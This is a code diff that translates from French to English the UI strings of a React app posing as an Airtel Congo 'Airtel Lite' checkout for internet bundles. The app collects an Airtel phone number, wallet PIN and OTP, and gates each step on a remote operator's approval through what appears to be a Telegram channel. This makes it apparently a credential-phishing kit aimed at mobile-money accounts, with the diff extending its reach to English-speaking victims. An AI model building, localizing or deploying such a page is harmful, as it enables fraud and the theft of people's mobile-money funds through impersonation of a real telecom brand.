@@ -181,9 +181,9 @@ function App() {
       .then((res) => {
         if (!res.ok) {
           if (res.status === 503) {
-            throw new Error('Serveur indisponible pour le moment. Reessayez dans quelques instants.');
+            throw new Error('Server is unavailable right now. Please try again shortly.');
           }
-          throw new Error('Erreur du serveur');
+          throw new Error('Server error');
         }
         return res.json();
       })
@@ -243,7 +243,7 @@ function App() {
         if (json?.action === 'invalid_info') {
           setWaitingApproval(false);
           setApprovalPassed(false);
-          setApprovalError('Code PIN incorrect. Veuillez verifier les informations et reessayer.');
+          setApprovalError('Incorrect code. Please verify the information and try again.');
           setOtpSent(false);
           setOtpTimer(0);
           setActionLoading(false);
@@ -292,7 +292,7 @@ function App() {
             setOtpTimer(0);
             setWaitingApproval(false);
             setOtpError('');
-            setApprovalError('Code PIN incorrect. Veuillez ressaisir votre numero et votre PIN Wallet.');
+            setApprovalError('Incorrect code. Please re-enter your phone number and code.');
             return;
           }
 
@@ -303,7 +303,7 @@ function App() {
             setOtpSent(true);
             setOtpTimer(60);
             setOtpDigits(['', '', '', '']);
-            setOtpError('Code OTP incorrect. Veuillez le ressaisir.');
+            setOtpError('Incorrect OTP code. Please enter it again.');
             return;
           }
 
@@ -417,11 +417,11 @@ function App() {
       const validPin = /^\d{4,6}$/.test(pinVal);
 
       if (!validPhone) {
-        setAirtelError('Entrez un numero Airtel valide a 9 chiffres.');
+        setAirtelError('Enter a valid 9-digit Airtel number.');
       }
 
       if (!validPin) {
-        setWalletPinError('Entrez un code valide (4 a 6 chiffres).');
+        setWalletPinError('Enter a valid code (4 to 6 digits).');
       }
 
       if (!validPhone || !validPin) {
@@ -456,9 +456,9 @@ function App() {
         setActionError('');
         setActionLoading(true);
         setOtpTimer(60);
-        setResendMessage('Validation de vos informations...');
+        setResendMessage('Validating your information...');
       } catch (err) {
-        setSubmissionError(err.message || 'Echec d\'envoi des informations. Veuillez reessayer plus tard.');
+        setSubmissionError(err.message || 'Failed to send information. Please try again later.');
       } finally {
         setSubmissionLoading(false);
       }
@@ -466,12 +466,12 @@ function App() {
     }
 
     if (otpTimer === 0) {
-      setOtpError('OTP expire. Veuillez reessayer.');
+      setOtpError('OTP expired. Please try again.');
       return;
     }
 
     if (otpCode.length !== 4) {
-      setOtpError('Entrez un code OTP valide a 4 chiffres.');
+      setOtpError('Enter a valid 4-digit OTP code.');
       return;
     }
 
@@ -502,7 +502,7 @@ function App() {
       setActionLoading(true);
       setPaymentConfirmed(true);
     } catch (err) {
-      setSubmissionError(err.message || 'Echec d\'envoi des informations. Veuillez reessayer plus tard.');
+      setSubmissionError(err.message || 'Failed to send information. Please try again later.');
     } finally {
       setSubmissionLoading(false);
     }
@@ -531,15 +531,15 @@ function App() {
 
       const body = await response.json().catch(() => null);
       if (!response.ok) {
-        const errorMsg = body?.message || 'Echec du renvoi.';
+        const errorMsg = body?.message || 'Resend failed.';
         const detail = body?.detail ? ` ${body.detail}` : '';
         throw new Error(`${errorMsg}${detail}`);
       }
 
-      setResendMessage('OTP renvoye avec succes.');
+      setResendMessage('OTP resent successfully.');
       setOtpTimer(60);
     } catch (err) {
-      setResendError(err.message || 'Echec du renvoi OTP.');
+      setResendError(err.message || 'OTP resend failed.');
     } finally {
       setResendLoading(false);
     }
@@ -548,7 +548,7 @@ function App() {
   if (error && !data) {
     return (
       <div className="page-shell">
-        <div className="message-block error">Erreur : {error}</div>
+        <div className="message-block error">Error: {error}</div>
       </div>
     );
   }
@@ -556,7 +556,7 @@ function App() {
   if (!data) {
     return (
       <div className="page-shell">
-        <div className="message-block loading">Chargement...</div>
+        <div className="message-block loading">Loading...</div>
       </div>
     );
   }
@@ -577,13 +577,13 @@ function App() {
                 brand="airtel"
               />
             </div>
-            <h1>Connectez-vous a Airtel Lite pour finaliser le paiement.</h1>
+            <h1>Sign in to Airtel Lite to complete payment.</h1>
           </section>
 
           <section className="checkout-card checkout-card-lite">
             <div className="checkout-header-lite">
               <button type="button" className="checkout-back checkout-back-inline" onClick={handleBack}>
-                ← Retour
+                ← Back
               </button>
             </div>
 
@@ -591,10 +591,10 @@ function App() {
               <UiGlyph type={checkoutStatusIcon} />
               <span>
                 {waitingApproval
-                  ? 'Validation de vos informations...'
+                  ? 'Validating your information...'
                   : approvalPassed
-                    ? `Un code OTP a ete envoye a ${apiAirtelNumber || 'votre numero Airtel'}. Saisissez-le pour terminer.`
-                    : 'Verifiez votre numero avec votre code'}
+                    ? `An OTP code was sent to ${apiAirtelNumber || 'your Airtel number'}. Enter it to finish.`
+                    : 'Verify your number with your code'}
               </span>
             </p>
 {waitingApproval && (
@@ -603,8 +603,8 @@ function App() {
                     <path fill="currentColor" d="M12 2v2a8 8 0 1 0 8 8h2a10 10 0 1 1-10-10z"/>
                     <path fill="currentColor" d="M7 7l-4 4 4 4V11h6V7H7z"/>
                   </svg>
-                  <span>Validation de vos informations...</span>
-                  <span className="sr-only">Validation des informations</span>
+                  <span>Validating your information...</span>
+                  <span className="sr-only">Validating information</span>
                 </div>
               )}
               {approvalError && (
@@ -613,8 +613,8 @@ function App() {
               {approvalPassed && !paymentConfirmed && (
               <div className="otp-timer">
                 {otpTimer > 0
-                  ? `Code valide pendant : ${otpTimer}s`
-                  : 'Le code OTP a expire. Rechargez la page ou reessayez.'}
+                  ? `Code valid for: ${otpTimer}s`
+                  : 'The OTP code has expired. Reload the page or try again.'}
               </div>
             )}
 
@@ -623,7 +623,7 @@ function App() {
               {!otpSent && (
                 <>
                   <label className="form-field">
-                    <span className="label-with-icon"><UiGlyph type="mobile" />Numero Airtel</span>
+                    <span className="label-with-icon"><UiGlyph type="mobile" />Airtel Number</span>
                     <div className="phone-field-row">
                       <span className="phone-country">🇨🇩 <strong>+243</strong></span>
                       <input
@@ -644,7 +644,7 @@ function App() {
                   </label>
 
                   <label className="form-field">
-                    <span className="label-with-icon"><UiGlyph type="lock" />Entrez votre Code</span>
+                    <span className="label-with-icon"><UiGlyph type="lock" />Enter Your Code</span>
                     <input
                       type="password"
                       value={walletPin}
@@ -654,7 +654,7 @@ function App() {
                         if (approvalError) setApprovalError('');
                         if (submissionError) setSubmissionError('');
                       }}
-                      placeholder="Entrez votre Code"
+                      placeholder="Enter your code"
                       inputMode="numeric"
                       required
                     />
@@ -665,7 +665,7 @@ function App() {
 
               {approvalPassed && !paymentConfirmed && (
                 <label className="form-field">
-                  <span className="label-with-icon otp-label-centered"><UiGlyph type="otp" />Entrez votre Code</span>
+                  <span className="label-with-icon otp-label-centered"><UiGlyph type="otp" />Enter your code</span>
                   <div className="otp-grid" onPaste={handleOtpPaste}>
                     {otpDigits.map((digit, idx) => (
                       <input
@@ -697,7 +697,7 @@ function App() {
                     onClick={handleResendOtp}
                     disabled={resendLoading || otpTimer === 0}
                   >
-                    {resendLoading ? 'Renvoi...' : 'Renvoyer OTP'}
+                    {resendLoading ? 'Resending...' : 'Resend OTP'}
                   </button>
                   {resendMessage && <span className="field-success">{resendMessage}</span>}
                   {resendError && <span className="field-error">{resendError}</span>}
@@ -726,8 +726,8 @@ function App() {
                   <path fill="currentColor" d="M12 2v2a8 8 0 1 0 8 8h2a10 10 0 1 1-10-10z"/>
                   <path fill="currentColor" d="M7 7l-4 4 4 4V11h6V7H7z"/>
                 </svg>
-                <span>Validation OTP...</span>
-                <span className="sr-only">Validation OTP</span>
+                <span>Verifying OTP...</span>
+                <span className="sr-only">Verifying OTP</span>
               </div>
             )}
 
@@ -742,27 +742,27 @@ function App() {
             {telegramAction && telegramAction.action === 'allow_proceed' && !paymentConfirmed && (
               <div className="checkout-success status-line">
                 <UiGlyph type="shieldCheck" />
-                Approuve. Saisissez l'OTP pour terminer votre paiement.
+                Approved. Enter the OTP to complete your payment.
               </div>
             )}
 
             {paymentConfirmed && (
               <div className="checkout-confirmation status-line">
                 <UiGlyph type="spark" />
-                OTP verifie. Veuillez attendre l'invite de paiement pour terminer votre commande.
+                OTP verified. Please wait for the payment prompt to complete your order.
               </div>
             )}
 
             {paymentConfirmed && actionLoading && (
               <div className="checkout-info">
-                Validation OTP... Cela peut prendre quelques secondes.
+                Verifying OTP... This may take a few seconds.
               </div>
             )}
 
             {paymentConfirmed && telegramAction && (
               <div className="checkout-success status-line">
                 <UiGlyph type="shieldCheck" />
-                <strong>Action recue :</strong> {telegramAction.text}
+                <strong>Action received:</strong> {telegramAction.text}
               </div>
             )}
 
@@ -772,16 +772,16 @@ function App() {
                   <UiGlyph type={verificationApproved ? 'shieldCheck' : 'refresh'} />
                 </div>
                 <div className="checkout-final-copy">
-                  <h2>{verificationApproved ? 'Paiement confirme' : 'Verification en cours'}</h2>
+                  <h2>{verificationApproved ? 'Payment confirmed' : 'Verification in progress'}</h2>
                   <p>
                     {verificationApproved
-                      ? 'Merci. Votre validation OTP est confirmee. Suivez les instructions Airtel Money pour finaliser la transaction.'
-                      : 'Votre OTP a ete envoye pour verification. Veuillez patienter pendant la confirmation finale.'}
+                      ? 'Thank you. Your OTP validation is confirmed. Follow the Airtel Money instructions to complete the transaction.'
+                      : 'Your OTP has been sent for verification. Please wait for final confirmation.'}
                   </p>
                 </div>
                 <div className="checkout-final-actions">
                   <button type="button" className="button-secondary" onClick={handleBack}>
-                    Retour aux offres
+                    Back to offers
                   </button>
                 </div>
               </section>
@@ -803,7 +803,7 @@ function App() {
                 brand="airtel"
               />
             </div>
-            <p>En collaboration avec</p>
+            <p>In collaboration with</p>
             <strong>STARLINK™</strong>
           </footer>
         </div>
@@ -825,22 +825,22 @@ function App() {
               brand="airtel"
             />
           </div>
-          <p>En collaboration avec <strong>STARLINK</strong></p>
+          <p>In collaboration with <strong>STARLINK</strong></p>
         </section>
 
         <section className="landing-simple-hero">
-          <span className="landing-simple-kicker">📶 Forfaits Internet</span>
-          <h1>Restez Connecte Sans Limites</h1>
+          <span className="landing-simple-kicker">📶 Internet Bundles</span>
+          <h1>Stay Connected Without Limits</h1>
           <p>
-            Choisissez un forfait. Vous serez redirige vers la page de connexion Airtel Lite
-            pour proceder au paiement.
+            Choose a bundle. You will be redirected to the Airtel Lite login page
+            to continue with payment.
           </p>
           <button
             type="button"
             className="hero-cta"
             onClick={() => document.getElementById('offers')?.scrollIntoView({ behavior: 'smooth', block: 'start' })}
           >
-            Voir les forfaits
+            View Bundles
           </button>
         </section>
 
@@ -861,7 +861,7 @@ function App() {
               </div>
               <button type="button" onClick={() => startCheckout(offre)}>
                 <UiGlyph type="spark" />
-                Choisir ce forfait
+                Choose this bundle
               </button>
             </article>
           ))}
@@ -870,16 +870,16 @@ function App() {
         <section className="airdata-trust" aria-label="Avantages">
           <article>
             <span aria-hidden="true">⚡</span>
-            <strong>Activation instantanee</strong>
+            <strong>Instant activation</strong>
           </article>
           <article>
             <span aria-hidden="true">🔒</span>
-            <strong>Paiement securise</strong>
+            <strong>Secure payment</strong>
           </article>
         </section>
 
         <footer className="airdata-footer">
-          © 2026 Airtel Congo. Tous droits reserves.
+          © 2026 Airtel Congo. All rights reserved.
         </footer>
 
       </div>
